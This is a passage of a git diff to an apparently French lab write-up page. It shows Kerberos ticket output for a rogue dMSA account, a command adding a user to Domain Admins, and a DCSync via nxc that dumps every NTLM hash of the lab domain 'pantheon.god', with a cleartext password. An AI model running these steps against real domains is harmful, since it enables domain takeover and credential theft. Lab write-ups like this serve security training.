QFhjPwOprgM1HnTZW0L56Px29BWnaOCQiYp3YXeUA6lduhUwJ3nQme6W5MoW+NgFMBW3bHNNq8jCvNjtus0irt6WnQplYCm6ljXRV+un/nyAZdJkV/kA5NZN0coJnBnFwYrIzWjgekwgeagAwIBAKKB3gSB232B2DCB1aCB0jCBzzCBzKArMCmgAwIBEqEiBCCXPpomIhE67zr2al+TvlYzJe4D/2PLMkFuTsz1X8//Q6EOGwxwYW50aGVvbi5nb2SiGDAWoAMCAQGhDzANGwtwd25lZF9kTVNBJKMHAwUAYKEAAKURGA8yMDI1MDYyMTE5NTcxOFqmERgPMjAyNTA2MjEyMDEyMThapxEYDzIwMjUwNjI4MTkzOTAxWqgOGwxQQU5USEVPTi5HT0SpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFBBTlRIRU9OLkdPRA==
+<a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>
+<a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>  ServiceName              :  krbtgt/PANTHEON.GOD
+<a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>  ServiceRealm             :  PANTHEON.GOD
+<a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>  UserName                 :  pwned_dMSA$ (NT_PRINCIPAL)
+<a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>  UserRealm                :  pantheon.god
+<a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a>  StartTime                :  6/21/2025 7:57:18 PM
+<a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a>  EndTime                  :  6/21/2025 8:12:18 PM
+<a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a>  RenewTill                :  6/28/2025 7:39:01 PM
+<a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a>  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+<a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a>  KeyType                  :  aes256_cts_hmac_sha1
+<a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a>  Base64(key)              :  lz6aJiIROu869mpfk75WMyXuA/9jyzJBbk7M9V/P/0M=
+<a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a>  Current Keys for pwned_dMSA$: (aes256_cts_hmac_sha1) 96382D52C19DC606FF501EAD0FDB514EA2AD7C3AAF82FBC9EB584FE244A34753
+<a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a>
+<a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a>PS C:\Users\hades\Desktop&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>PS C:\Users\hades\Desktop&gt; net group &quot;domain admins&quot; /add orphee /domain
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>The request will be processed at a domain controller for domain pantheon.god.
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>The command completed successfully.
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>PS C:\Users\hades\Desktop&gt;
+</code></pre></div>
+<p>On as pus ce rajouter en tant d’aministrateur du domain. </p>
+<p>Cela nous permet de faire un <code>DCsync</code> pour récupérer tout les hash du domain</p>
+<p><code>``bash
+nxc smb "192.168.56.11" -u "$USER" -p "$PASSWORD" --ntds
+[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil [Y/n]
+SMB         192.168.56.11   445    PANTHEON-DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:PANTHEON-DC01) (domain:pantheon.god) (signing:True) (SMBv1:False)
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] pantheon.god\orphee:Mus1cM@st3r!2024 (admin)
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         192.168.56.11   445    PANTHEON-DC01    Administrator:500:aad3b435b51404eeaad3b435b51404ee:aff6a388446bba49babad7aaf35aae83:::
+SMB         192.168.56.11   445    PANTHEON-DC01    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         192.168.56.11   445    PANTHEON-DC01    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d6f782d1249a05a188a3fd2336004c1c:::
+SMB         192.168.56.11   445    PANTHEON-DC01    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+SMB         192.168.56.11   445    PANTHEON-DC01    zeus:1112:aad3b435b51404eeaad3b435b51404ee:5b68357e3a16721b6523dff3234652ae:::
+SMB         192.168.56.11   445    PANTHEON-DC01    hera:1113:aad3b435b51404eeaad3b435b51404ee:d1eb28b8b4081c051bcf65050fe65ca0:::
+SMB         192.168.56.11   445    PANTHEON-DC01    poseidon:1114:aad3b435b51404eeaad3b435b51404ee:d1c741139ff861b32a322a0352ae265d:::
+SMB         192.168.56.11   445    PANTHEON-DC01    demeter:1115:aad3b435b51404eeaad3b435b51404ee:a8300dbc2a0f174b64951c9da08e4d0b:::
+SMB         192.168.56.11   445    PANTHEON-DC01    athena:1116:aad3b435b51404eeaad3b435b51404ee:416d0ff6775086300c6221ae7efbc402:::
+SMB         192.168.56.11   445    PANTHEON-DC01    apollo:1117:aad3b435b51404eeaad3b435b51404ee:5746e19586565c6742ed10f8d469b639:::
+SMB         192.168.56.11   445    PANTHEON-DC01    artemis:1118:aad3b435b51404eeaad3b435b51404ee:c7b57775c739c2fa8d5e24032a2f0fbe:::
+SMB         192.168.56.11   445    PANTHEON-DC01    ares:1119:aad3b435b51404eeaad3b435b51404ee:551fc4fb35460741f949253495ac1698:::
+SMB         192.168.56.11   445    PANTHEON-DC01    aphrodite:1120:aad3b435b51404eeaad3b435b51404ee:17f0fd7ea28eb4be24153ff2ec3e6119:::
+SMB         192.168.56.11   445    PANTHEON-DC01    hephaistos:1121:aad3b435b51404eeaad3b435b51404ee:bc93607a09d45adb70ce0f02869021d6:::
+SMB         192.168.56.11   445    PANTHEON-DC01    hermes:1122:aad3b435b51404eeaad3b435b51404ee:1a7639670465f9deaa2b4534f1867a32:::
+SMB         192.168.56.11   445    PANTHEON-DC01    dionysos:1123:aad3b435b51404eeaad3b435b51404ee:bb11bc506d66de79df5fbcbd7ede151c:::
+SMB         192.168.56.11   445    PANTHEON-DC01    achille:1124:aad3b435b51404eeaad3b435b51404ee:95718c56984fbe7f6ae1958433b16880:::
+SMB         192.168.56.11   445    PANTHEON-DC01    theseus:1125:aad3b435b51404eeaad3b435b51404ee:06cf37a4cd7e41d838b37092cf0d9cf9:::
+SMB         192.168.56.11   445    PANTHEON-DC01    perseus:1126:aad3b435b51404eeaad3b435b51404ee:48505186cb6ffaad4f14c52509b8438e:::
+SMB         192.168.56.11   445    PANTHEON-DC01    ulysse:1127:aad3b435b51404eeaad3b435b51404ee:36a6da7303d1a46aab641d44ba6990af:::
+SMB         192.168.56.11   445    PANTHEON-DC01    jason:1128:aad3b435b51404eeaad3b435b51404ee:b40f85d1bd20d52e721d9731753e5892:::
+SMB         192.168.56.11   445    PANTHEON-DC01    orphee:1129:aad3b435b51404eeaad3b435b51404ee:e5434e98bb7d29c8b4392bcca15d860a:::
+SMB         192.168.56.11   445    PANTHEON-DC01    asclepios:1130:aad3b435b51404eeaad3b435b51404ee:e1ef927a14e399b67f532b5f492570a4:::
+SMB         192.168.56.11   445    PANTHEON-DC01    psyche:1131:aad3b435b51404eeaad3b435b51404ee:499dcff82f6d25be7b267a94c2cdb62e:::
+SMB         192.168.56.11   445    PANTHEON-DC01    ganymede:1132:aad3b435b51404eeaad3b435b51404ee:32e822f8b80fca89e0f70dfb9a6ffb47:::
+SMB         192.168.56.11   445    PANTHEON-DC01    hades:1133:aad3b435b51404eeaad3b435b51404ee:ead49bdbe3311143eeafbcb14d8ae126:::
+SMB         192.168.56.11   445    PANTHEON-DC01    cronos:1134:aad3b435b51404eeaad3b435b51404ee:9c0a518fd5a9ae01c9282203980ad85b:::
+SMB         192.168.56.11   445    PANTHEON-DC01    iapetos:1135:aad3b435b51404eeaad3b435b51404ee:7b247761b5db99db000a9e077e0155f2:::
+SMB         192.168.56.11   445    PANTHEON-DC01    coeus:1136:aad3b435b51404eeaad3b435b51404ee:ee853d94f3c5ddfc40f764426b758284:::
+SMB         192.168.56.11   445    PANTHEON-DC01    hyperion:1137:aad3b435b51404eeaad3b435b51404ee:5c41d7ea5b8215a005052c21b233edf0:::
+SMB         192.168.56.11   445    PANTHEON-DC01    krios:1138:aad3b435b51404eeaad3b435b51404ee:f1de6b7dcf24a30198b8aa823ab7e2b0:::
+SMB         192.168.56.11   445    PANTHEON-DC01    smbscores:1139:aad3b435b51404eeaad3b435b51404ee:54e48c5f048847ce13fa805e1459b63e:::
+SMB         192.168.56.11   445    PANTHEON-DC01    hercule:1140:aad3b435b51404eeaad3b435b51404ee:0906d53ebe3acdd2a545355ced7053f8:::
+SMB         192.168.56.11   445    PANTHEON-DC01    PANTHEON-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:044d32223bdc78362acd13fc27ea5dad:::
+SMB         192.168.56.11   445    PANTHEON-DC01    PANTHEON-ENFERS$:1104:aad3b435b51404eeaad3b435b51404ee:c26c2e72ed7035dcde9b910b4e0cf411:::
+SMB         192.168.56.11   445    PANTHEON-DC01    svc_thunderB$:1111:aad3b435b51404eeaad3b435b51404ee:dd0f819d9e5971f7b0927b33a6c7dfd7:::
+SMB         192.168.56.11   445    PANTHEON-DC01    pwned_dMSA$:1141:aad3b435b51404eeaad3b435b51404ee:bda205d296baf2743022fd78bb41b82a:::
+SMB         192.168.56.11   445    PANTHEON-DC01    [+] Dumped 37 NTDS hashes to /root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds of which 33 were added to the database
+SMB         192.168.56.11   445    PANTHEON-DC01    [*] To extract only enabled accounts from the output file, run the following command:
+SMB         192.168.56.11   445    PANTHEON-DC01    [*] cat /root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         192.168.56.11   445    PANTHEON-DC01    [*] grep -iv disabled /root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds | cut -d ':' -f1
+[orphee@pantheon.god][Jun 26, 2025 - 07:10:37 (CEST)] exegol-pantheon_wu exploit #</code></p>
 
 
 
@@ -960,7 +1386,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 6, 2025 23:01:24 UTC">July 6, 2025</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 6, 2025 23:48:26 UTC">July 6, 2025</span>
   </span>
 
     
